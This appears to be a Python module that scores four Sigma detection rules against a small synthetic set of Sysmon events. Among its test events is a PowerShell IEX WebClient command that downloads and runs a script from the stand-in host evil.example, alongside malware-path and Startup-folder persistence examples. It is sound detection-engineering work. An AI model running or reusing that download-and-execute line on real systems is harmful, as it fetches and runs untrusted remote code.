"""TP/FP/FN baseline evaluation for the 4 fully operational curated rules (M2-02).

Scope note (per the M2-05 description validated with the user): the M1-07
dataset (UACME_59_Sysmon.evtx, T1548.002 UAC bypass) does not correspond to
any curated rule, so it cannot serve as ground truth here. This module uses
a small purpose-built evaluation set instead: one positive event per
operational rule, plus benign events shared across all rules. The 3 partial
rules (M2-02) are excluded from this measurement, not silently ignored -
see docs/tp_fp_fn_baseline.md for the full write-up.
"""

from dataclasses import dataclass

from sqlalchemy.orm import Session

from forensix.detection.executor import run_all_rules
from forensix.models.db import EventRecord
from forensix.models.event import NetworkInfo, NormalizedEvent, ProcessInfo
from forensix.repository import bulk_insert_events

# Sigma rule ids of the 4 fully operational rules (docs/sigma_rules.md).
RULE_PATH = "3dfd06d2-eaf4-4532-9555-68aca59f57c4"
RULE_DOWNLOAD = "e6c54d94-498c-4562-a37c-b469d8e9a275"
RULE_STARTUP = "28208707-fe31-437f-9a7f-4b1108b94d2e"
RULE_MOBSYNC = "9f2cc74d-78af-4eb2-bb64-9cd1d292b87b"
OPERATIONAL_RULE_IDS = {RULE_PATH, RULE_DOWNLOAD, RULE_STARTUP, RULE_MOBSYNC}

EVAL_HOST = "M2-05-EVAL"


@dataclass
class EvalCase:
    """One evaluation event plus the rule it is expected to trigger (or None)."""

    event: NormalizedEvent
    expected_rule_id: str | None
    description: str = ""


@dataclass
class RuleScore:
    """TP/FP/FN counts for a single operational rule."""

    rule_id: str
    true_positives: int = 0
    false_positives: int = 0
    false_negatives: int = 0


def build_eval_dataset() -> list[EvalCase]:
    """Build the positive + benign evaluation events."""
    cases = [
        EvalCase(
            NormalizedEvent(
                id="eval-pos-path",
                timestamp="2026-08-16T10:00:00",
                host=EVAL_HOST,
                source="sysmon",
                event_id="1",
                event_type="sysmon_event",
                process=ProcessInfo(name="C:\\Perflogs\\malware.exe"),
            ),
            RULE_PATH,
            "Process launched from a suspicious folder (Perflogs)",
        ),
        EvalCase(
            NormalizedEvent(
                id="eval-pos-download",
                timestamp="2026-08-16T10:01:00",
                host=EVAL_HOST,
                source="sysmon",
                event_id="1",
                event_type="sysmon_event",
                process=ProcessInfo(
                    command_line=(
                        "powershell.exe IEX ((New-Object Net.WebClient)."
                        "DownloadString('http://evil.example/payload.ps1'))"
                    )
                ),
            ),
            RULE_DOWNLOAD,
            "PowerShell IEX + WebClient download pattern",
        ),
        EvalCase(
            NormalizedEvent(
                id="eval-pos-startup",
                timestamp="2026-08-16T10:02:00",
                host=EVAL_HOST,
                source="sysmon",
                event_id="11",
                event_type="sysmon_event",
                file={
                    "path": (
                        "C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\"
                        "Start Menu\\Programs\\Startup\\malicious.ps1"
                    )
                },
            ),
            RULE_STARTUP,
            "Suspicious file dropped in the Startup folder",
        ),
        EvalCase(
            NormalizedEvent(
                id="eval-pos-mobsync",
                timestamp="2026-08-16T10:03:00",
                host=EVAL_HOST,
                source="sysmon",
                event_id="3",
                event_type="sysmon_event",
                process=ProcessInfo(name="C:\\Windows\\System32\\mobsync.exe"),
                network=NetworkInfo(destination_ip="8.8.8.8"),
            ),
            RULE_MOBSYNC,
            "mobsync.exe connecting to a public IP",
        ),
        EvalCase(
            NormalizedEvent(
                id="eval-benign-normal-app",
                timestamp="2026-08-16T10:04:00",
                host=EVAL_HOST,
                source="sysmon",
                event_id="1",
                event_type="sysmon_event",
                process=ProcessInfo(name="C:\\Program Files\\Notepad++\\notepad++.exe"),
            ),
            None,
            "Legitimate application in a normal install path",
        ),
        EvalCase(
            NormalizedEvent(
                id="eval-benign-notepad-open",
                timestamp="2026-08-16T10:05:00",
                host=EVAL_HOST,
                source="sysmon",
                event_id="1",
                event_type="sysmon_event",
                process=ProcessInfo(
                    command_line="notepad.exe C:\\Users\\victim\\Documents\\notes.txt"
                ),
            ),
            None,
            "Ordinary command line, no download pattern",
        ),
        EvalCase(
            NormalizedEvent(
                id="eval-benign-document",
                timestamp="2026-08-16T10:06:00",
                host=EVAL_HOST,
                source="sysmon",
                event_id="11",
                event_type="sysmon_event",
                file={"path": "C:\\Users\\victim\\Documents\\report.docx"},
            ),
            None,
            "File created outside the Startup folder",
        ),
        EvalCase(
            NormalizedEvent(
                id="eval-benign-mobsync-private-ip",
                timestamp="2026-08-16T10:07:00",
                host=EVAL_HOST,
                source="sysmon",
                event_id="3",
                event_type="sysmon_event",
                process=ProcessInfo(name="C:\\Windows\\System32\\mobsync.exe"),
                network=NetworkInfo(destination_ip="192.168.1.10"),
            ),
            None,
            "mobsync.exe connecting to a private IP (must be excluded by CIDR filter)",
        ),
    ]
    return cases


def compute_tp_fp_fn(session: Session) -> dict[str, RuleScore]:
    """Insert the evaluation dataset, run all rules, and score the 4 operational rules.

    Cleans up the inserted evaluation events before returning, so this
    function can be called repeatedly (e.g. in CI) without accumulating data.
    """
    cases = build_eval_dataset()
    events = [case.event for case in cases]
    expected_by_event_id = {case.event.id: case.expected_rule_id for case in cases}

    bulk_insert_events(session, events)
    try:
        results = run_all_rules(session)

        scores = {rule_id: RuleScore(rule_id) for rule_id in OPERATIONAL_RULE_IDS}
        for match in results:
            if match.rule_id not in OPERATIONAL_RULE_IDS or match.error is not None:
                continue
            score = scores[match.rule_id]
            for event_id in match.matched_event_ids:
                if event_id not in expected_by_event_id:
                    continue
                if expected_by_event_id[event_id] == match.rule_id:
                    score.true_positives += 1
                else:
                    score.false_positives += 1

        for rule_id, score in scores.items():
            expected_positive_ids = {
                eid for eid, expected in expected_by_event_id.items() if expected == rule_id
            }
            detected_ids = {
                eid
                for match in results
                if match.rule_id == rule_id
                for eid in match.matched_event_ids
            }
            score.false_negatives = len(expected_positive_ids - detected_ids)

        return scores
    finally:
        session.query(EventRecord).filter(EventRecord.host == EVAL_HOST).delete()
        session.commit()
